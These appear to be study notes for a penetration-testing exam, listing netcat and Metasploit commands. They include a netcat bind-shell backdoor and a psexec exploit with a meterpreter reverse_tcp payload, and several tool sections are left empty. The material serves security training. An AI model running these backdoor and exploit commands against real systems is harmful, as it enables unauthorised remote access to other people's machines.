# Common Tools

## Exam Outcome

Demonstrate competence with common tools including netcat, SSH, Ettercap, p0f, etc...

### netcat

Setting up a Listener:

```
nc -l -p [port]
nc -l -p [2222]
```

Connecting to the Listener:

```
nc [ip_of_listener] [port]
nc 10.10.75.75 2222
```

Create Backdoor on Linux:

```
nc -l [port] -e /bin/sh
nc -l 7777 -e /bin/sh
```

Connect to the backdoor:

```
nc.exe [ip_of_listener] [port]
nc.exe 10.10.75.75 7777
```

### SSH

### Ettercap

### p0f

### Metasploit

Starting Metasploit:

```
msfconsole
```

Listing Exploits:

```
show exploits
```

Searching Exploits:

```
search type:exploit psexec
```

Acquiring Info on an Exploit:

```
info exploit/windows/smb/psexec
```

Selecting an Exploit to Use:

```
use exploit/windows/smb/psexec
```

Configuring Exploit Settings:

```
set PAYLOAD windows/meterpreter/reverse_tcp
```

Showing Options:

```
show options
```

Configuring Variables:

```
set RHOST [Target IP]
set SMBUser [username]
set SMBPass [password]
set LHOST [source/attacker IP]
```

Launching Exploit:

```
exploit
```

Backgrounding a Session:

```
background
```

Listing Sessions:

```
sessions -l
```

```
sessions -i [session #]
```





### etc...

